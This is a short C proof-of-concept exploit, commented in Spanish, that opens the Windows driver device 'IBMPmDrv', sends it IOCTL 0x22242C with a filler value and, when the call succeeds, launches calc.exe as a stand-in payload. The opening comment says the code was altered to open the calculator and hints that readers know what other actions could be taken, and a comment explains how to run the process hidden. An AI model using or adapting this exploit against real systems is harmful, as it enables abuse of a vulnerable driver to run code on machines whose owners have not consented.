/*
el codigo fue modificado para que abra la 
calculadora. Logicamente varios sabemos 
que acciones se puede tomar. 
*/


#include <windows.h>
#include <stdio.h>

#define DRIVER_NAME "\\\\.\\IBMPmDrv"
#define TARGET_IOCTL 0x22242C

int main() {
    // Intentar abrir el manejador del driver
    HANDLE hDriver = CreateFileA(DRIVER_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Error: No se pudo abrir el driver.\n");
        return 1;
    }

    DWORD inB = 0x41414141, outB = 0, bytes;

    // Enviar el código de control IOCTL al driver
    if (DeviceIoControl(hDriver, TARGET_IOCTL, &inB, 4, &outB, 4, &bytes, NULL)) {
        printf("[!] IOCTL 0x22242C exitoso. Iniciando la calculadora...\n");

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        
        // Inicializar las estructuras para el nuevo proceso
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW; // Cambiar a SW_HIDE si querés que corra en segundo plano

        // Ruta de la aplicación que se desea ejecutar
        char calcPath[] = "C:\\Windows\\System32\\calc.exe";

        // Crear el proceso de la calculadora de forma independiente
        if (CreateProcessA(NULL, calcPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[+] Calculadora abierta con exito.\n");
            
            // Cerrar los manejadores devueltos para evitar fugas de memoria
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            printf("[-] Error al intentar ejecutar la calculadora. Codigo: %lu\n", GetLastError());
        }
    } else {
        printf("[-] Error al enviar el comando IOCTL.\n");
    }

    CloseHandle(hDriver);
    return 0;
}

